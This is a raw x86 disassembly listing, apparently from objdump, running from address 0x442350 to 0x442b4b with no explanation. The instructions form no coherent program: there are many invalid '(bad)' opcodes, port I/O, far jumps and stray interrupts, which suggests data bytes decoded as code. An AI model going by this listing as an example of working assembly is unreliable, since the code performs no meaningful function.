  442350:	push   edx
  442351:	fcom   DWORD PTR [edi]
  442353:	test   eax,0xc43bc6b4
  442358:	fwait
  442359:	adc    DWORD PTR [esi-0x7182636c],edi
  44235f:	push   ebp
  442360:	and    eax,0x74e86441
  442365:	xchg   edi,eax
  442366:	adc    DWORD PTR [ebx],esp
  442368:	mov    edx,0xd0abc930
  44236d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  44236e:	sbb    DWORD PTR [eax+0x31],0x1a
  442372:	out    dx,eax
  442373:	out    0x11,al
  442375:	mov    ds:0x32b14e1b,eax
  44237a:	jp     0x44239a
  44237c:	pmulhw mm0,QWORD PTR [edx-0x5000ddf7]
  442383:	push   es
  442384:	pop    ss
  442385:	mov    ebp,0xa5bdacbf
  44238a:	sub    eax,DWORD PTR [ecx+0x56]
  44238d:	add    al,BYTE PTR [esi+0x27]
  442390:	in     al,dx
  442391:	mov    ecx,0x6ca77e00
  442396:	mov    bl,0x84
  442398:	sar    bh,0xdc
  44239b:	shl    ebp,1
  44239d:	mov    eax,0x9c08ea25
  4423a2:	clc    
  4423a3:	ins    BYTE PTR es:[edi],dx
  4423a4:	mov    edx,0x76b6bc57
  4423a9:	lea    esi,[edx-0x541854ec]
  4423af:	xor    dh,dh
  4423b1:	inc    edx
  4423b2:	mul    BYTE PTR [ecx]
  4423b4:	out    0x5e,eax
  4423b6:	xor    al,bl
  4423b8:	mov    edi,0x24803cf1
  4423bd:	jns    0x4423dd
  4423bf:	repz cld 
  4423c1:	scas   al,BYTE PTR es:[edi]
  4423c2:	jns    0x4423c5
  4423c4:	outs   dx,BYTE PTR ds:[esi]
  4423c5:	pushf  
  4423c6:	jmp    0x4423de
  4423c8:	mov    dh,0xc7
  4423ca:	jb     0x4423f6
  4423cc:	sub    BYTE PTR [ebx+0x3d],al
  4423cf:	cli    
  4423d0:	and    BYTE PTR [eax],0x60
  4423d3:	mov    eax,0xe00e1e7
  4423d8:	int    0x4a
  4423da:	mov    eax,0x3bd0a1d4
  4423df:	ins    DWORD PTR es:[edi],dx
  4423e0:	test   BYTE PTR [ecx+ebx*8],0xe9
  4423e4:	or     DWORD PTR [ecx+0x71c69208],ebp
  4423ea:	or     eax,0xbd9c9c19
  4423ef:	aam    0x77
  4423f1:	ins    BYTE PTR es:[edi],dx
  4423f2:	cmp    ebx,DWORD PTR [esi+0x56]
  4423f5:	aam    0xee
  4423f7:	(bad)  
  4423f8:	(bad)  [eax-0x7a443355]
  4423fe:	fld    TBYTE PTR [edi+0x13]
  442401:	pop    ebp
  442402:	xchg   ebp,eax
  442403:	or     eax,0xe2394abf
  442408:	sub    ecx,edi
  44240a:	mov    ah,0x60
  44240c:	frstor [esi]
  44240e:	outs   dx,DWORD PTR ds:[esi]
  44240f:	inc    ecx
  442410:	and    DWORD PTR [ecx+0x20],eax
  442413:	fnsave ds:0x19b0628a
  442419:	hlt    
  44241a:	mov    esp,0x5d0b8f4f
  44241f:	lds    ebx,FWORD PTR [edi]
  442421:	mov    ecx,0x1aae56a7
  442426:	stos   BYTE PTR es:[edi],al
  442427:	mov    al,0x76
  442429:	ret    
  44242a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  44242b:	inc    ebx
  44242c:	leave  
  44242d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  44242e:	test   DWORD PTR [edi],0x665ea432
  442434:	iret   
  442435:	sar    BYTE PTR [ecx+0x471e2ef4],1
  44243b:	pop    esi
  44243c:	push   ebp
  44243d:	adc    bl,ch
  44243f:	call   0x94938670
  442444:	sbb    al,0x99
  442446:	loope  0x442426
  442448:	jg     0x442411
  44244a:	fmul   QWORD PTR [ebp-0x5b545c8c]
  442450:	rol    dl,cl
  442452:	and    al,BYTE PTR [edx-0x5e]
  442455:	mov    dl,0x23
  442457:	lock jmp 0x3dc9699a
  44245d:	xchg   ebx,eax
  44245e:	jmp    0x8e9b:0x7ba0fae9
  442465:	ds push esi
  442467:	xlat   BYTE PTR ds:[ebx]
  442468:	daa    
  442469:	sub    eax,0x92f34a0
  44246e:	imul   edi,esp,0x22152a78
  442474:	and    ah,BYTE PTR [eax-0x1d4827c]
  44247a:	xor    BYTE PTR [esp+ebp*1+0x38b4b8f1],ch
  442481:	call   0x9796:0x4cffcf86
  442488:	icebp  
  442489:	repnz mov edi,0xfba8cd74
  44248f:	cmp    DWORD PTR [ebx-0x18ca9800],eax
  442495:	je     0x442458
  442497:	imul   eax,DWORD PTR [ebp+0xba4be38],0x457bcec0
  4424a1:	leave  
  4424a2:	shr    dh,1
  4424a4:	adc    eax,0x23591367
  4424a9:	jmp    0x80ebe3fd
  4424ae:	ror    BYTE PTR [edi+0x7d],1
  4424b1:	xor    eax,0x3874fe9c
  4424b6:	sti    
  4424b7:	mov    esp,0xd4b1aeb0
  4424bc:	and    ebx,DWORD PTR [ecx]
  4424be:	mov    dh,0x32
  4424c0:	fsubr  DWORD PTR [ebp+0x2e]
  4424c3:	ins    DWORD PTR es:[edi],dx
  4424c4:	push   0xc
  4424c6:	ins    BYTE PTR es:[edi],dx
  4424c7:	jmp    0x7c89:0xfad391f1
  4424ce:	out    dx,eax
  4424cf:	pop    esi
  4424d0:	enter  0xb71b,0x92
  4424d4:	pop    ss
  4424d5:	mov    ecx,0x565a3acc
  4424da:	popa   
  4424db:	and    al,0xf0
  4424dd:	lahf   
  4424de:	mov    ebx,0x7649365a
  4424e3:	mov    bh,0xd4
  4424e5:	sub    edx,esp
  4424e7:	mov    DWORD PTR [ecx+0x9],ecx
  4424ea:	test   al,0x5
  4424ec:	pop    ss
  4424ed:	aaa    
  4424ee:	inc    esi
  4424ef:	icebp  
  4424f0:	inc    esi
  4424f1:	mov    ds:0xf13a02b,al
  4424f6:	fsub   QWORD PTR [ebx+0x6d274f1d]
  4424fc:	fcom   DWORD PTR [ebx-0x30170b4c]
  442502:	mov    cl,0xde
  442504:	in     eax,0xb2
  442506:	shr    eax,1
  442508:	loope  0x442585
  44250a:	lds    eax,FWORD PTR [eax+0x2e41691c]
  442510:	fcom   QWORD PTR [edx-0x52]
  442513:	push   es
  442514:	retf   
  442515:	cdq    
  442516:	sbb    esi,DWORD PTR [ecx*1-0x1e655b50]
  44251d:	mov    eax,ds:0x70c0f530
  442522:	mov    esp,0x95e448e4
  442527:	outs   dx,DWORD PTR ds:[esi]
  442528:	push   es
  442529:	mov    esp,0x88fe570e
  44252e:	mul    esi
  442530:	popa   
  442531:	dec    esp
  442532:	retf   0x455c
  442535:	pop    ebx
  442536:	push   cs
  442537:	sub    al,0xc7
  442539:	cmp    al,0xb9
  44253b:	in     al,0xc6
  44253d:	setp   BYTE PTR [esi*4+0x39ed9b4b]
  442545:	xchg   esi,eax
  442546:	inc    ebx
  442547:	ret    0x8921
  44254a:	adc    BYTE PTR [esi-0x5a635f2d],cl
  442550:	(bad)  
  442551:	test   al,0x1b
  442553:	pop    edi
  442554:	cmp    al,0x55
  442556:	sub    eax,eax
  442558:	sbb    BYTE PTR [esi+0x26],dh
  44255b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  44255c:	mov    esi,0x259526a8
  442561:	adc    BYTE PTR [esi+0x6b9f8953],bh
  442567:	lahf   
  442568:	gs jnp 0x44252b
  44256b:	leave  
  44256c:	fimul  WORD PTR [esi+0x1a]
  44256f:	es es pop ecx
  442572:	mov    ecx,0xd3a3d664
  442577:	pop    edx
  442578:	cmp    eax,0x92255c11
  44257d:	pusha  
  44257e:	test   DWORD PTR [edi],ecx
  442580:	(bad)  
  442581:	retf   
  442582:	adc    al,0xe9
  442584:	and    bl,BYTE PTR [ecx+0x2d09dab8]
  44258a:	fcom   DWORD PTR [edi-0x2a]
  44258d:	jle    0x4425db
  44258f:	fsubr  st(6),st
  442591:	sub    eax,DWORD PTR [esi-0x10]
  442594:	pushf  
  442595:	nop
  442596:	mov    dh,0x56
  442598:	repz push eax
  44259a:	stc    
  44259b:	aad    0xa4
  44259d:	sub    BYTE PTR [eax-0x61584b5c],bh
  4425a3:	bound  eax,QWORD PTR [ebp+0x47]
  4425a6:	int    0xe8
  4425a8:	inc    ecx
  4425a9:	jne    0x44254d
  4425ab:	mov    ecx,0xd3a93920
  4425b0:	mov    edi,DWORD PTR [ebp-0x5c]
  4425b3:	pop    ss
  4425b4:	ins    DWORD PTR es:[edi],dx
  4425b5:	adc    ecx,DWORD PTR [edx*2+0x55d5a7e0]
  4425bc:	inc    edx
  4425bd:	mov    WORD PTR [ebx+0x4c592ce9],ss
  4425c3:	mov    ds,WORD PTR [eax]
  4425c5:	(bad)  
  4425c6:	hlt    
  4425c7:	and    esp,DWORD PTR [eax-0x5adec0cb]
  4425cd:	inc    esp
  4425ce:	push   es
  4425cf:	call   0x468fb300
  4425d4:	sbb    al,0xf9
  4425d6:	sbb    ah,BYTE PTR [ecx-0x1eb2e0f6]
  4425dc:	daa    
  4425dd:	mov    eax,ds:0x579a0ffb
  4425e2:	xor    eax,0x8ca08bb8
  4425e7:	push   ecx
  4425e8:	call   0x1a88dce8
  4425ed:	pop    ss
  4425ee:	sahf   
  4425ef:	rcl    ebp,1
  4425f1:	jg     0x442642
  4425f3:	jmp    0xd919:0x73604e9f
  4425fa:	jle    0x442646
  4425fc:	or     ch,BYTE PTR [esi+ebp*2]
  4425ff:	aaa    
  442600:	cld    
  442601:	call   0x76c2:0xccce41cb
  442608:	cmp    eax,0x48275bd6
  44260d:	cmp    DWORD PTR [edi-0x22b082c3],edi
  442613:	out    dx,al
  442614:	dec    DWORD PTR [ecx]
  442616:	adc    esi,eax
  442618:	xchg   DWORD PTR gs:[ebx-0x5408ef0c],ebp
  44261f:	add    DWORD PTR [ebx],esp
  442621:	dec    ecx
  442622:	js     0x4425bf
  442624:	mov    ds:0xe9fce536,al
  442629:	fwait
  44262a:	retf   
  44262b:	fsubr  DWORD PTR [eax-0xa]
  44262e:	fdivr  st(1),st
  442630:	xchg   ebp,eax
  442631:	fisub  DWORD PTR [ecx+0x48]
  442634:	ss dec edx
  442636:	mov    ch,0x14
  442638:	and    eax,0x95813280
  44263d:	jecxz  0x442605
  44263f:	jmp    0x791e:0xcbeabee2
  442646:	dec    ebp
  442647:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  442648:	lock cdq 
  44264a:	in     al,dx
  44264b:	arpl   WORD PTR [ecx+ebx*4+0x7b],ax
  44264f:	imul   edx,ebx,0xffffff99
  442652:	inc    ebp
  442653:	sbb    al,0x72
  442655:	jno    0x442602
  442657:	lahf   
  442658:	jno    0x4425fa
  44265a:	xor    ebp,eax
  44265c:	jmp    0x442652
  44265e:	dec    esp
  44265f:	loope  0x4426c2
  442661:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  442662:	sub    eax,DWORD PTR ds:0x76b24f7a
  442668:	mov    edx,0x979e741c
  44266d:	aaa    
  44266e:	sub    BYTE PTR [ebp-0x5b2f64e7],dh
  442674:	rol    BYTE PTR [ebp+ecx*2-0x6bf56cf9],cl
  44267b:	imul   BYTE PTR [esi]
  44267d:	mov    eax,ds:0xb077a964
  442682:	jge    0x442646
  442684:	sub    DWORD PTR fs:[ebx+0x314d94f4],esi
  44268b:	add    DWORD PTR ds:0xe0ece56b,0x7f
  442692:	leave  
  442693:	jb     0x4426cb
  442695:	(bad)  
  442696:	cmc    
  442697:	rcr    bh,0xdd
  44269a:	mov    ecx,0x9f1b97f4
  44269f:	add    DWORD PTR [esi+0x9],eax
  4426a2:	leave  
  4426a3:	fstp   QWORD PTR [edx]
  4426a5:	frstor [eax-0x40]
  4426a8:	jmp    0x4426f6
  4426aa:	iret   
  4426ab:	sbb    esp,DWORD PTR [esi+0x59]
  4426ae:	loope  0x4426b4
  4426b0:	pushf  
  4426b1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4426b2:	push   esp
  4426b3:	push   edx
  4426b4:	movs   DWORD PTR es:[edi],DWORD PTR cs:[esi]
  4426b6:	sub    edi,DWORD PTR [edi-0x60]
  4426b9:	repnz addr16 mov al,0x7f
  4426bd:	pop    esi
  4426be:	inc    edx
  4426bf:	pushf  
  4426c0:	add    DWORD PTR [esi-0x41],eax
  4426c3:	add    al,0xe5
  4426c5:	stc    
  4426c6:	pop    ss
  4426c7:	ins    DWORD PTR es:[edi],dx
  4426c8:	(bad)  
  4426c9:	push   esp
  4426ca:	sub    bl,BYTE PTR [ebx+0x40]
  4426cd:	xchg   ebx,eax
  4426ce:	dec    ebp
  4426cf:	sbb    edi,esp
  4426d1:	add    edi,DWORD PTR [edx-0x3b5728c8]
  4426d7:	mov    bh,0x94
  4426d9:	in     al,0xbd
  4426db:	add    DWORD PTR fs:[edi+ebp*2+0x4e7539a7],ecx
  4426e3:	lds    ecx,FWORD PTR [ebp+ecx*1+0x403c84b9]
  4426ea:	je     0x44271f
  4426ec:	outs   dx,DWORD PTR ds:[esi]
  4426ed:	xor    BYTE PTR [ebp-0x4071468c],bh
  4426f3:	dec    ebp
  4426f4:	jbe    0x4426a4
  4426f6:	fiadd  DWORD PTR [eax]
  4426f8:	popa   
  4426f9:	add    ch,0xdb
  4426fc:	sub    al,0xc4
  4426fe:	mov    al,ds:0x7ba56cd6
  442703:	rcr    DWORD PTR [ebp-0x6c],1
  442706:	or     ah,BYTE PTR fs:[esi+0xffa5cc4]
  44270d:	cmp    al,0xba
  44270f:	fcom   QWORD PTR fs:[edi+0x38]
  442713:	in     eax,dx
  442714:	mov    ch,0xa1
  442716:	sub    ecx,0x7bcfef0e
  44271c:	pop    ss
  44271d:	leave  
  44271e:	dec    edx
  44271f:	aas    
  442720:	rol    DWORD PTR [ebx-0x60c5f07a],cl
  442726:	cmp    esi,DWORD PTR [eax+ebp*1+0x3d]
  44272a:	add    DWORD PTR [edi-0x12],esp
  44272d:	mov    cl,0x6d
  44272f:	xor    al,0xc3
  442731:	and    DWORD PTR [edi+0x7ffcc954],esi
  442737:	inc    ebp
  442738:	imul   edi,esp,0x627adc90
  44273e:	mov    esi,0xc73bb4cc
  442743:	push   ecx
  442744:	xchg   edx,eax
  442745:	dec    ecx
  442746:	xchg   edi,eax
  442747:	in     al,dx
  442748:	jp     0x442767
  44274a:	cdq    
  44274b:	add    eax,0xcab3bf6b
  442750:	push   ebp
  442751:	leave  
  442752:	je     0x442746
  442754:	add    DWORD PTR [ebx-0x5b],edx
  442757:	not    DWORD PTR [edx+0x39]
  44275a:	xchg   esp,eax
  44275b:	push   ss
  44275c:	xchg   BYTE PTR [edi],al
  44275e:	push   ds
  44275f:	fs iret 
  442761:	cli    
  442762:	inc    ebx
  442763:	jb     0x4426e9
  442765:	fistp  WORD PTR [ecx+ebp*8]
  442768:	pop    ebp
  442769:	adc    edx,DWORD PTR [ebp+0x59]
  44276c:	pusha  
  44276d:	add    bl,cl
  44276f:	test   BYTE PTR ds:0x2329e2a1,dh
  442775:	imul   esp,DWORD PTR [eax+ecx*8+0x3f],0x6881da44
  44277d:	(bad)  
  44277e:	cmp    dl,BYTE PTR [edx]
  442780:	add    eax,0x1df38741
  442785:	jecxz  0x44275a
  442787:	jmp    0x4427a7
  442789:	(bad)  
  44278a:	jns    0x442740
  44278c:	sub    DWORD PTR [ebx+0x4e828895],edx
  442792:	stos   BYTE PTR es:[edi],al
  442793:	loopne 0x442797
  442795:	mov    ebp,0x9a4c34b7
  44279a:	sub    ecx,DWORD PTR [ecx]
  44279c:	ror    BYTE PTR [ebp-0x68],cl
  44279f:	xchg   BYTE PTR [ebx+0xa9a1586],al
  4427a5:	scas   al,BYTE PTR es:[edi]
  4427a6:	mov    edx,0x7915a124
  4427ab:	(bad)  ds:0x4af88335
  4427b1:	and    esi,edi
  4427b3:	aaa    
  4427b4:	test   DWORD PTR [ecx],ebx
  4427b6:	sbb    eax,0x2c4ef52d
  4427bb:	inc    ebp
  4427bc:	fs mov al,0x5e
  4427bf:	pop    edi
  4427c0:	rcl    al,0xb7
  4427c3:	adc    BYTE PTR [esi+0x1694df31],al
  4427c9:	imul   edx,DWORD PTR [esp+esi*1+0x50c30600],0xf4d3a08f
  4427d4:	mov    bl,0xa5
  4427d6:	add    DWORD PTR [esi+ebx*2-0x1d],0x5e6f411c
  4427de:	mov    DWORD PTR [esi],esp
  4427e0:	jo     0x4427ac
  4427e2:	loop   0x442828
  4427e4:	sbb    bl,al
  4427e6:	aas    
  4427e7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4427e8:	and    cl,cl
  4427ea:	scas   al,BYTE PTR es:[edi]
  4427eb:	lods   al,BYTE PTR ds:[esi]
  4427ec:	cld    
  4427ed:	ss out 0x9,eax
  4427f0:	push   es
  4427f1:	popf   
  4427f2:	retf   
  4427f3:	jae    0x4427f4
  4427f5:	xchg   edi,eax
  4427f6:	jge    0x442856
  4427f8:	pop    ecx
  4427f9:	dec    ebx
  4427fa:	mov    dl,0x56
  4427fc:	mov    al,0x73
  4427fe:	mov    bl,0x54
  442800:	mov    ch,0xf9
  442802:	(bad)  
  442803:	jbe    0x4427ac
  442805:	scas   eax,DWORD PTR es:[edi]
  442806:	dec    edi
  442807:	sub    BYTE PTR [ecx+ebp*2],ah
  44280a:	mov    al,0x60
  44280c:	ret    
  44280d:	out    0xec,al
  44280f:	xor    DWORD PTR [ecx],esp
  442811:	leave  
  442812:	fisttp QWORD PTR [eax+0x6f]
  442815:	pop    edx
  442816:	jle    0x442891
  442818:	jno    0x4427d0
  44281a:	dec    ebx
  44281b:	or     al,0x35
  44281d:	bound  ebx,QWORD PTR [ecx-0x3e5a2bc3]
  442823:	daa    
  442824:	jl     0x442861
  442826:	and    bh,BYTE PTR [ecx+0x47feb91b]
  44282c:	test   eax,0x2d78da39
  442831:	shr    cl,0xdd
  442834:	cmp    DWORD PTR [ebx-0x24],ebp
  442837:	jl     0x442861
  442839:	leave  
  44283a:	mov    ebx,0x2d70494
  44283f:	sar    BYTE PTR [ebx],1
  442841:	adc    BYTE PTR [esi+0x15],ch
  442844:	aad    0xd5
  442846:	pop    ecx
  442847:	jmp    0x4427cf
  442849:	pushf  
  44284a:	or     eax,DWORD PTR [edi+0x26]
  44284d:	int    0x7b
  44284f:	(bad)  
  442850:	mov    ecx,0x5f2db784
  442855:	or     DWORD PTR [ebp-0x325703bc],edi
  44285b:	fsub   QWORD PTR [ebx*4-0x6088036c]
  442862:	sub    esp,DWORD PTR [ebx]
  442864:	push   ebx
  442865:	mov    bl,0xa5
  442867:	cmp    DWORD PTR [ecx-0x3e],ebp
  44286a:	push   ds
  44286b:	outs   dx,DWORD PTR ds:[esi]
  44286c:	int3   
  44286d:	mov    ds:0x6a8a3,eax
  442872:	call   0xd867:0x3ba1cdf1
  442879:	inc    ebx
  44287a:	test   eax,0xbce331e
  44287f:	pop    ebp
  442880:	sbb    ecx,edi
  442882:	mov    ds:0xcbf9bb4c,al
  442887:	aas    
  442888:	push   cs
  442889:	mov    cl,0x7b
  44288b:	in     eax,0x2a
  44288d:	sub    DWORD PTR [esi],edx
  44288f:	xchg   ecx,eax
  442890:	jns    0x4428f6
  442892:	cmp    dl,bl
  442894:	and    eax,0xef82d2c9
  442899:	mov    ah,0x50
  44289b:	shl    DWORD PTR [esi],0x9a
  44289e:	pop    ebx
  44289f:	out    dx,eax
  4428a0:	pop    esp
  4428a1:	sbb    al,0x1f
  4428a3:	call   0x4d0e:0x93c76769
  4428aa:	int3   
  4428ab:	test   BYTE PTR [edx],dl
  4428ad:	cld    
  4428ae:	test   al,0x1c
  4428b0:	mov    ebx,0x64e37bb5
  4428b5:	cmp    BYTE PTR [eax],dh
  4428b7:	push   ebx
  4428b8:	fisttp QWORD PTR [edx]
  4428ba:	mov    ecx,edx
  4428bc:	pop    ds
  4428bd:	pop    eax
  4428be:	push   0x7f
  4428c0:	push   ds
  4428c1:	leave  
  4428c2:	xchg   dh,bh
  4428c4:	pop    ss
  4428c5:	cmp    eax,0x9ec46066
  4428ca:	mov    edi,eax
  4428cc:	int3   
  4428cd:	enter  0x3158,0x9d
  4428d1:	mov    ebx,edx
  4428d3:	and    cl,dl
  4428d5:	cld    
  4428d6:	mov    ebx,0xe9633c4
  4428db:	inc    ebx
  4428dc:	(bad)  
  4428dd:	fcomip st,st(2)
  4428df:	pop    esp
  4428e0:	ins    DWORD PTR es:[edi],dx
  4428e1:	mov    eax,ds:0xd1e98d79
  4428e6:	repz out dx,al
  4428e8:	xchg   ecx,eax
  4428e9:	jmp    0x145ada9
  4428ee:	lock dec eax
  4428f0:	es dec edx
  4428f2:	or     cl,bl
  4428f4:	and    esi,DWORD PTR [ebp+0x7505289a]
  4428fa:	mov    DWORD PTR [ecx+0x64beee09],edx
  442900:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  442901:	hlt    
  442902:	arpl   ax,cx
  442904:	xlat   BYTE PTR ds:[ebx]
  442905:	cli    
  442906:	mov    si,0x1f95
  44290b:	fst    QWORD PTR [ecx]
  44290d:	jno    0x4428c4
  44290f:	loopne 0x44292f
  442911:	fld    DWORD PTR [ebx]
  442913:	sub    BYTE PTR [edi+0x57],0xc1
  442917:	mov    ds:0x753b9eeb,eax
  44291c:	dec    ecx
  44291d:	or     eax,DWORD PTR [ecx+0x11]
  442920:	xchg   bl,cl
  442922:	jne    0x442982
  442924:	out    0x45,al
  442926:	(bad)  
  442927:	in     al,0x57
  442929:	stos   DWORD PTR es:[edi],eax
  44292a:	sub    al,0xdb
  44292c:	rcr    DWORD PTR [ecx-0x36f92d0e],0x72
  442933:	sub    bh,BYTE PTR [esi-0x5f]
  442936:	pop    es
  442937:	enter  0x4ac0,0xd3
  44293b:	jl     0x44292a
  44293d:	mov    ds:0x129aa4b4,eax
  442942:	test   al,0x71
  442944:	not    DWORD PTR [ebx+0x78ddb894]
  44294a:	sbb    al,0xee
  44294c:	mov    dl,al
  44294e:	popf   
  44294f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  442950:	sahf   
  442951:	push   cs
  442952:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  442953:	push   esi
  442954:	cdq    
  442955:	cld    
  442956:	mov    dl,0x94
  442958:	fsub   QWORD PTR [ecx+0x3dba4ddb]
  44295e:	xchg   esp,eax
  44295f:	adc    dl,dh
  442961:	ds enter 0xe153,0x15
  442966:	mov    esp,0xbb862f4
  44296b:	addr16 cmc 
  44296d:	xchg   esp,eax
  44296e:	test   al,0xf4
  442970:	cmc    
  442971:	loopne 0x442924
  442973:	int3   
  442974:	sbb    ebp,DWORD PTR [ecx+0x77fbfa92]
  44297a:	and    DWORD PTR [edi-0x4b],0xb56e89a6
  442981:	out    0xf9,al
  442983:	js     0x442963
  442985:	aad    0x4c
  442987:	mov    ah,0xd6
  442989:	push   esi
  44298a:	cmp    BYTE PTR [ecx],bl
  44298c:	jo     0x442913
  44298e:	inc    eax
  44298f:	loopne 0x44294c
  442991:	pop    ss
  442992:	mov    edx,0xc3baa144
  442997:	dec    edi
  442998:	(bad)  
  442999:	dec    ebx
  44299a:	jle    0x442976
  44299c:	and    ch,cl
  44299e:	sbb    ebp,DWORD PTR [edi+0x390cb070]
  4429a4:	push   es
  4429a5:	inc    ebp
  4429a6:	mov    bh,0xe4
  4429a8:	popa   
  4429a9:	sub    edx,DWORD PTR [ebp+0x27eb756f]
  4429af:	dec    BYTE PTR [ebx+0x40]
  4429b2:	scas   eax,DWORD PTR es:[edi]
  4429b3:	add    eax,0xe994e1a1
  4429b8:	mov    ds:0x8ce4ca6b,eax
  4429bd:	leave  
  4429be:	aas    
  4429bf:	inc    edx
  4429c0:	push   esp
  4429c1:	mov    dh,0xf2
  4429c3:	pusha  
  4429c4:	mov    ch,0x65
  4429c6:	int3   
  4429c7:	icebp  
  4429c8:	adc    bh,dh
  4429ca:	dec    ebx
  4429cb:	out    dx,eax
  4429cc:	mov    gs,WORD PTR [edx]
  4429ce:	das    
  4429cf:	je     0x4429f1
  4429d1:	jns    0x442a42
  4429d3:	(bad)  
  4429d4:	sub    eax,0xf5e9b5fe
  4429d9:	test   DWORD PTR [edx],edi
  4429db:	jmp    0x4113:0x98dab33a
  4429e2:	and    ah,BYTE PTR gs:[eax-0x35]
  4429e6:	ret    
  4429e7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4429e8:	into   
  4429e9:	mov    edi,0x8c71e482
  4429ee:	cld    
  4429ef:	jae    0x442988
  4429f1:	ja     0x442a61
  4429f3:	dec    esi
  4429f4:	neg    BYTE PTR [ebx-0x6e0870a]
  4429fa:	mov    dh,0x20
  4429fc:	jb     0x4429c0
  4429fe:	call   0xcbec05d3
  442a03:	add    al,0xbf
  442a05:	pop    ebx
  442a06:	cdq    
  442a07:	call   0xdbf01499
  442a0c:	ds retf 
  442a0e:	mov    ch,0x34
  442a10:	sbb    DWORD PTR [ebx+ecx*4+0x6c8ecdae],esi
  442a17:	push   ebp
  442a18:	out    dx,eax
  442a19:	jle    0x442a89
  442a1b:	ja     0x4429ff
  442a1d:	fidivr DWORD PTR [ebx-0x5f7563ba]
  442a23:	mov    dh,0x22
  442a25:	lods   eax,DWORD PTR ds:[esi]
  442a26:	(bad)  
  442a27:	cld    
  442a28:	jne    0x442a68
  442a2a:	mov    esp,ebp
  442a2c:	sbb    eax,DWORD PTR [edx+0x46]
  442a2f:	retf   
  442a30:	and    bh,BYTE PTR [ecx-0x6f84ee2e]
  442a36:	pop    es
  442a37:	xchg   edx,eax
  442a38:	or     al,0xa1
  442a3a:	or     edx,DWORD PTR [ebp+0x557df48c]
  442a40:	repnz outs dx,DWORD PTR ds:[esi]
  442a42:	xchg   bh,al
  442a44:	dec    edi
  442a45:	iret   
  442a46:	and    eax,0x55fe1f05
  442a4b:	xchg   ecx,eax
  442a4c:	rep lods al,BYTE PTR ds:[esi]
  442a4e:	stos   DWORD PTR es:[edi],eax
  442a4f:	das    
  442a50:	enter  0x64b8,0xef
  442a54:	xchg   edi,eax
  442a55:	pop    ebx
  442a56:	sbb    BYTE PTR [ecx],bh
  442a58:	and    BYTE PTR [ecx],bh
  442a5a:	lock test eax,0x4bb196db
  442a60:	jmp    0xd2c1b644
  442a65:	mov    dh,0x1e
  442a67:	xor    DWORD PTR [ecx-0x4a1888aa],eax
  442a6d:	add    BYTE PTR [edx-0x4603f7e1],al
  442a73:	push   esp
  442a74:	pop    ds
  442a75:	(bad)  
  442a76:	in     al,dx
  442a77:	imul   eax,DWORD PTR ds:0x63e9fc46,0xffffffb9
  442a7e:	mul    BYTE PTR [ecx]
  442a80:	pop    ds
  442a81:	fst    DWORD PTR [edx]
  442a83:	mov    al,ds:0x8f127017
  442a88:	call   0x15c6971b
  442a8d:	das    
  442a8e:	loope  0x442aa8
  442a90:	cld    
  442a91:	in     al,dx
  442a92:	mov    esp,0xb48916d4
  442a97:	fsub   DWORD PTR [ebx-0x4b1c8618]
  442a9d:	test   al,0xbb
  442a9f:	add    BYTE PTR [ebx],al
  442aa1:	imul   DWORD PTR [esi+0x19]
  442aa4:	in     eax,dx
  442aa5:	cmp    DWORD PTR ds:0x2646b84a,esp
  442aab:	aad    0x24
  442aad:	cdq    
  442aae:	jp     0x442a45
  442ab0:	adc    DWORD PTR [edi+0x6152424b],ebx
  442ab6:	push   ss
  442ab7:	xchg   DWORD PTR [ecx-0x5ef113e2],ecx
  442abd:	mov    BYTE PTR [edi-0x94ef0ec],dh
  442ac3:	loope  0x442a8a
  442ac5:	cmp    esp,DWORD PTR [ebp-0x17]
  442ac8:	out    0x8b,eax
  442aca:	cmp    al,0x16
  442acc:	xchg   edx,eax
  442acd:	pop    edx
  442ace:	xor    ebp,DWORD PTR [edx]
  442ad0:	pop    ds
  442ad1:	or     DWORD PTR [edi-0x5b1fcff5],edx
  442ad7:	stc    
  442ad8:	test   DWORD PTR [eax+0x42],edi
  442adb:	test   BYTE PTR [ebx],0xde
  442ade:	sbb    bl,dh
  442ae0:	repz jo 0x442a70
  442ae3:	stos   BYTE PTR es:[edi],al
  442ae4:	frstpm(287 only) 
  442ae6:	mov    dh,0x34
  442ae8:	xor    DWORD PTR [esi+edx*8],edi
  442aeb:	add    BYTE PTR [edi-0x4a43644e],0xf9
  442af2:	in     eax,dx
  442af3:	repz sti 
  442af5:	das    
  442af6:	enter  0xd9b0,0x30
  442afa:	stos   BYTE PTR es:[edi],al
  442afb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  442afc:	xchg   esp,eax
  442afd:	outs   dx,DWORD PTR ds:[esi]
  442afe:	mov    ecx,0x4ba47ff8
  442b03:	cdq    
  442b04:	(bad)  
  442b05:	pop    edi
  442b06:	xlat   BYTE PTR ds:[ebx]
  442b07:	xor    DWORD PTR [ebp-0x2bfed78e],ebp
  442b0d:	xor    edi,DWORD PTR [ebx]
  442b0f:	push   ss
  442b10:	addr16 inc eax
  442b12:	mov    esp,0xf15b8e03
  442b17:	shl    DWORD PTR [ebp-0x20],1
  442b1a:	jp     0x442b09
  442b1c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  442b1d:	ds mov ch,0x93
  442b20:	call   0x42c4:0xf2b4b35c
  442b27:	mov    cl,0xb5
  442b29:	cdq    
  442b2a:	xchg   ebp,esp
  442b2c:	in     ax,dx
  442b2e:	push   ebx
  442b2f:	repnz pop ds
  442b31:	cmp    DWORD PTR [ebx-0x23],eax
  442b34:	popf   
  442b35:	jmp    0x442b9b
  442b37:	sub    BYTE PTR [ebx+eiz*4-0x35],bh
  442b3b:	jbe    0x442b36
  442b3d:	pop    ebp
  442b3e:	inc    edx
  442b3f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  442b40:	sub    eax,0x1a027ced
  442b45:	mov    DWORD PTR [edi-0x4ed5ec1d],ebx
  442b4b:	cs jge 0x442aed
